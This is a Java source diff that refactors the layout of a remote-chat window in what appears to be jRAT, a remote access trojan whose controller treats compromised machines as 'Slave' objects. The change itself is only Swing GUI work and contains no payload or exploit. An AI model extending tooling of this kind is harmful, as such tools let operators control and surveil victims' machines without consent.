@@ -1,5 +1,6 @@
 package pro.jrat.client.ui.frames;
 
+import java.awt.BorderLayout;
 import java.awt.Color;
 import java.awt.Toolkit;
 import java.awt.event.ActionEvent;
@@ -9,9 +10,8 @@ import java.awt.event.KeyEvent;
 import java.awt.event.WindowAdapter;
 import java.awt.event.WindowEvent;
 import java.util.HashMap;
+import java.util.Map;
 
-import javax.swing.GroupLayout;
-import javax.swing.GroupLayout.Alignment;
 import javax.swing.ImageIcon;
 import javax.swing.JButton;
 import javax.swing.JFrame;
@@ -19,9 +19,8 @@ import javax.swing.JPanel;
 import javax.swing.JScrollPane;
 import javax.swing.JTextField;
 import javax.swing.JTextPane;
-import javax.swing.LayoutStyle.ComponentPlacement;
+import javax.swing.JToolBar;
 import javax.swing.ScrollPaneConstants;
-import javax.swing.border.EmptyBorder;
 import javax.swing.text.AttributeSet;
 import javax.swing.text.SimpleAttributeSet;
 import javax.swing.text.StyleConstants;
@@ -38,7 +37,7 @@ public class FrameRemoteChat extends BaseFrame {
 
 	private JPanel contentPane;
 	public Slave slave;
-	public static HashMap<Slave, FrameRemoteChat> instances = new HashMap<Slave, FrameRemoteChat>();
+	public static final Map<Slave, FrameRemoteChat> instances = new HashMap<Slave, FrameRemoteChat>();
 	public JTextField txtMsg;
 	public JTextPane txtChat;
 
@@ -58,45 +57,49 @@ public class FrameRemoteChat extends BaseFrame {
 		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
 		setBounds(100, 100, 450, 300);
 		contentPane = new JPanel();
-		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
 		setContentPane(contentPane);
 
 		JScrollPane scrollPane = new JScrollPane();
 		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
-
-		txtMsg = new JTextField();
-		txtMsg.addKeyListener(new KeyAdapter() {
-			@Override
-			public void keyPressed(KeyEvent arg0) {
-				if (arg0.getKeyCode() == KeyEvent.VK_ENTER) {
-					send();
-				}
-			}
-		});
-		txtMsg.setColumns(10);
-
-		JButton btnSend = new JButton("Send");
-		btnSend.setIcon(new ImageIcon(FrameRemoteChat.class.getResource("/icons/right.png")));
-		btnSend.addActionListener(new ActionListener() {
-			public void actionPerformed(ActionEvent e) {
-				send();
-			}
-		});
-
-		JButton btnNudge = new JButton("Nudge");
-		btnNudge.setIcon(new ImageIcon(FrameRemoteChat.class.getResource("/icons/nudge.png")));
-		btnNudge.addActionListener(new ActionListener() {
-			public void actionPerformed(ActionEvent arg0) {
-				sl.addToSendQueue(new Packet58NudgeChat());
-			}
-		});
-		GroupLayout gl_contentPane = new GroupLayout(contentPane);
-		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING).addGroup(gl_contentPane.createSequentialGroup().addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(Alignment.TRAILING, gl_contentPane.createSequentialGroup().addComponent(txtMsg, GroupLayout.DEFAULT_SIZE, 265, Short.MAX_VALUE).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnSend, GroupLayout.PREFERRED_SIZE, 83, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnNudge).addPreferredGap(ComponentPlacement.RELATED)).addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 423, Short.MAX_VALUE)).addGap(1)));
-		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 208, Short.MAX_VALUE).addPreferredGap(ComponentPlacement.RELATED).addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(txtMsg, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE).addComponent(btnNudge).addComponent(btnSend)).addGap(15)));
+		
+		JToolBar toolBar = new JToolBar();
+		toolBar.setFloatable(false);
+		
+				txtMsg = new JTextField();
+				toolBar.add(txtMsg);
+				txtMsg.addKeyListener(new KeyAdapter() {
+					@Override
+					public void keyPressed(KeyEvent arg0) {
+						if (arg0.getKeyCode() == KeyEvent.VK_ENTER) {
+							send();
+						}
+					}
+				});
+				txtMsg.setColumns(10);
+				
+						JButton btnSend = new JButton("Send");
+						toolBar.add(btnSend);
+						btnSend.setIcon(new ImageIcon(FrameRemoteChat.class.getResource("/icons/right.png")));
+						
+								JButton btnNudge = new JButton("Nudge");
+								toolBar.add(btnNudge);
+								btnNudge.setIcon(new ImageIcon(FrameRemoteChat.class.getResource("/icons/nudge.png")));
+								btnNudge.addActionListener(new ActionListener() {
+									public void actionPerformed(ActionEvent arg0) {
+										sl.addToSendQueue(new Packet58NudgeChat());
+									}
+								});
+						btnSend.addActionListener(new ActionListener() {
+							public void actionPerformed(ActionEvent e) {
+								send();
+							}
+						});
 
 		txtChat = new JTextPane();
 		scrollPane.setViewportView(txtChat);
-		contentPane.setLayout(gl_contentPane);
+		contentPane.setLayout(new BorderLayout(0, 0));
+		contentPane.add(toolBar, BorderLayout.SOUTH);
+		contentPane.add(scrollPane);
 
 		slave.addToSendQueue(new Packet48ChatStart());
 	}
